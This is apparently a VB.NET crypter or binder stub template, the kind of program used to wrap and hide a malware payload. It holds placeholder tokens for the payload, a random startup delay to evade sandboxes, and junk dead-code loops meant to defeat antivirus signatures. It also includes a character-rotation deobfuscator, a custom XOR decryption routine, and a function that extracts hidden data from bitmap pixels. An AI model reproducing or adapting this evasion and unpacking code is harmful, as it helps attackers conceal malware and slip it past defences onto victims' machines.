﻿Imports System
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports System.Reflection
Imports System.Reflection.Emit
Imports System.Diagnostics
Imports System.Text
Imports System.Drawing
Imports System.Collections
Imports System.Runtime.InteropServices

'-= Stub =-

'Option Explicit On
'Option Infer On
'Option Strict On

'%Assembly%

#Region " Junk Form "
<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class JunkForm1


End Class
#End Region

'Look
Module Stub_Module



    Sub Main()
        Try



            
            System.Threading.Thread.Sleep(New System.Random().Next(1249, 2501))

          





            '%Binder%

            While False

                Dim Oh6pxM0t4iUhMTbBF As Boolean = False
                Dim Q61CGC2UpF As Integer = 100
                Dim s8l2BV5z21xCF4am3zHy0DTJSE2S As Double = 10302263
                While 7988844 > 2844803
                    Do While 456 >= 295773
                        Do Until 38201070 <> 300970495
                            Q61CGC2UpF = 949
                            Do Until 9798294 = 4013743
                                Dim h9iVv8bdI2HCd7IFlbsDwym11O1k6k As Double = 278
                                For gOoa6Vn2y1luC05CE As Long = 0 To 16
                                    Do Until 64658713 <= 410073221
                                        Try
                                        Catch AxJTMOEL As Exception
                                            Oh6pxM0t4iUhMTbBF = False
                                            Dim gxanx As String = "\„3Œ|‡XV),(`Kp%(~O`)s~k}Ris€}j†Ut`({Mg2‰Q4z]xNo&H@ŽZ&Z.J=xi-BQlˆW %‹‰w+LW‡„uQ@vAfZ:Y`m#IMF|.v-g|XNm$OJ7Nm#+UL:_/&Nt‘SH’a[PA=t‡@'=#er"
                                            While 413 >= 71273047
                                            End While
                                            Do While 326206207 <= 633179
                                                s8l2BV5z21xCF4am3zHy0DTJSE2S = 208
                                            Loop
                                            Dim g017pHRVA0R As Integer = 186
                                        End Try
                                    Loop
                                    Do While 6 = 81
                                        s8l2BV5z21xCF4am3zHy0DTJSE2S = 46
                                        Dim edAYFoT4Yjx58a06YbGp8d55ciDV As String = "5Vb'5)SsZ=,eP}a‡ZxEiuL„‚mi\TX‹sl9'…$ygZn,$qTvotvAfRYx#{esM^`‘:b]@‹6voƒt0}hH2M‰Œzq7E@E‡5>@CK(p„T34~Y‘&P„An}NSRFVdx@#==$ WO`I'ƒ=v†‘8+S|jzS‘i*z~€‡V4O7‰9"
                                        Do Until 905730 <> 26137
                                            Oh6pxM0t4iUhMTbBF = False
                                            Dim D6UI2olr As Long = 785212219
                                            Try
                                            Catch YZ98dK5F6 As Exception
                                                s8l2BV5z21xCF4am3zHy0DTJSE2S = 37890255
                                                s8l2BV5z21xCF4am3zHy0DTJSE2S = 2896650
                                            End Try
                                            Q61CGC2UpF = 92
                                            For mce9MHKM4618kTddNK As Long = 6317 To 6
                                                Dim rp0nSzus14Y02bzC As Boolean = False
                                                Dim vS6Ln64sr As Decimal = 4284564
                                            Next
                                            Oh6pxM0t4iUhMTbBF = True
                                            Dim oQ41HnmgbZi As Double = 0
                                            For zioTHWtOB0B As Long = 56104 To 7
                                                Oh6pxM0t4iUhMTbBF = False
                                                Q61CGC2UpF = 1
                                            Next
                                            For E2UA2Le0jbBjb27m61u As Long = 8348 To 2263
                                                Dim W8zLIVUtZET7 As Boolean = True
                                            Next
                                        Loop
                                        Dim fsFTI As Integer = 54336
                                        If 916 <> 0 Then Dim s1eBEr = 68 Else Dim up0744f8t7R = 1
                                        For ZHcqB9H9iR1s9gT As Long = 51373750 To 46298003
                                            Dim pFwx66l5t8PoplG354cuGa3Ueb As Long = 35347
                                            While 4 <= 26973
                                                Dim o49gHXwK As Double = 6
                                            End While
                                            If 24384516 <> 979 Then
                                                Dim wEaMcG107T3XM7TR42jAD4RQ2Dn As Boolean = True
                                            End If
                                            Dim QOspevsnc8wMofb52qoH6l9 As Boolean = False
                                            Do Until 1 >= 3903
                                            Loop
                                        Next
                                    Loop
                                    If 36 < 48989 Then MsgBox("AI18d2q7m2") Else Dim iDPkMbU6tZEd = 155663073
                                Next
                            Loop
                            If 47 = 25727 Then MsgBox("H19XdkoQ7X5G9ELi") Else Dim c1f4787sHac0 = 628752
                        Loop
                        MsgBox("~ s(o/€ŠUXT@^?T‚{KLŒ>XU„2C†dKo^)\T.r3sŠ{.:€ …v7<ˆm:_QF^‚‰l€F){‰6!C t(8k!VJ:$1/^oGV!D]+hˆ?|Y†U$R‰}„R6[Ub]ŽŽD}x]B>‘fyel‰m*U?rw# Ez-G>,Xi_t ")
                    Loop
                    If 542070 <= 1563 Then MsgBox("p4r") Else Dim Y1O8yn4F = 9385452
                End While
                If 654499412 < 50608736 Then MsgBox("aaTIxUIj09eB63") Else Dim Lle6IQL328j41zgb3L3 = 3904715
            End While

            '%Everything%




        Catch EXCPTN As System.Exception


            System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & EXCPTN.ToString, System.Windows.Forms.Application.ProductName & " | Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
        End Try



    End Sub



    Private Function DeRotate(ByVal strInput As String) As String

        For x_drt As Integer = 1 To Microsoft.VisualBasic.Len(strInput)

            Mid(strInput, x_drt, 1) = Microsoft.VisualBasic.ChrW(Microsoft.VisualBasic.AscW(Microsoft.VisualBasic.Strings.Mid(strInput, x_drt, 1)) - 420)

        Next x_drt
        Return strInput
    End Function



    
    Public Function DeCrypt(ByVal FBcUIc0z1Z() As Byte, ByVal wruhUH8wn0s As String) As Byte()
        Dim wruhUH8wn0 As Byte() = Encoding.Default.GetBytes(wruhUH8wn0s)
        Dim hjhj As Integer
        For hjhj = (FBcUIc0z1Z.Length * 2) + wruhUH8wn0.Length To 0 Step -1
            FBcUIc0z1Z(hjhj Mod FBcUIc0z1Z.Length) = CByte((CInt(FBcUIc0z1Z(hjhj Mod FBcUIc0z1Z.Length) Xor wruhUH8wn0(hjhj Mod wruhUH8wn0.Length)) - CInt(FBcUIc0z1Z((hjhj + 1) Mod FBcUIc0z1Z.Length)) + 256) Mod 256)
        Next
        Return FBcUIc0z1Z
    End Function

    Public Function ReadDataFromBitmap(bitmap As Bitmap) As Byte()
        Dim buffer__1 As Byte() = New Byte(bitmap.Width * bitmap.Height * 3 - 1) {}

        Dim ghgh As Integer = 0
        For y As Integer = bitmap.Height - 1 To 0 Step -1
            For x As Integer = 0 To bitmap.Width - 1
                Dim pixelColor As Color = bitmap.GetPixel(x, y)
                buffer__1(ghgh * 3 + 2) = pixelColor.R
                buffer__1(ghgh * 3 + 1) = pixelColor.G
                buffer__1(ghgh * 3) = pixelColor.B
                ghgh += 1
            Next
        Next

        Dim data As Byte() = New Byte(BitConverter.ToInt32(buffer__1, 0) - 1) {}
        Buffer.BlockCopy(buffer__1, 4, data, 0, data.Length)
        Return data
    End Function




End Module

